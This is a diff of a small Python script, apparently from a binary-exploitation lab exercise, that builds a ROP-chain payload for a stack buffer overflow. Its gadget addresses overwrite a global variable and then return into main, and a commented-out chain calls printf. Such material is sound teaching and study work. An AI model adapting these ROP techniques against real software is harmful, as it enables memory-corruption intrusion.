@@ -4,12 +4,35 @@ from sys import stdout, stderr
 stdout.write("Six factorial is %d.      \x00\n")  # To be read into `plaintext`
 
 # Note payload cannot contain ord("\n")
+
+# Printf test
+# payload = [0x00000000] * 6 + [
+#     0x80512e0,  # printf address
+#     0x0805ebf9, # pop edx; pop ebx; ret;
+#     0x80e6ce0, # plaintext  #0x80b40a4, # format string
+#     125, # argument to printf %d argument
+#     0x080507f0,  # exit address
+# ]
+"""
+We can use 125 to a register value if we can put 
+4 pops in one ROP. prop number, plaintex, ROP with 3 pops, and printf address
+"""
+
+# Print the value of GLB using main.
 payload = [0x00000000] * 6 + [
-    0x80512e0,  # printf address
-    0x0805ebf9, # pop edx; pop ebx; ret;
-    0x80e6ce0, # plaintext  #0x80b40a4, # format string
-    125, # argument to printf %d argument
-    0x080507f0,  # exit address
+    0x0805ebf9,  # pop edx; pop ebx; ret;
+    0x80e6cc0,  # &glb
+    0x0,  # Dummy (put in ebx)
+    0x080b054a,  # pop eax; ret;
+    42,  # Value to store in eax
+    0x0805f932,  # mov dword ptr [edx], eax; ret;
+
+    0x080b2643,  # pop ebx; ret;
+    0x80e5000,  # $ebx at start of concatenate strings
+    0x08049859,  # pop ebp; ret;
+    0xffffd018,  # original ebp
+    0x8049eb7,  # the return address in main
+    # 0x08049efc,  # the address before the final call to printf in main
 ]
 
 #            &i   - &buffer
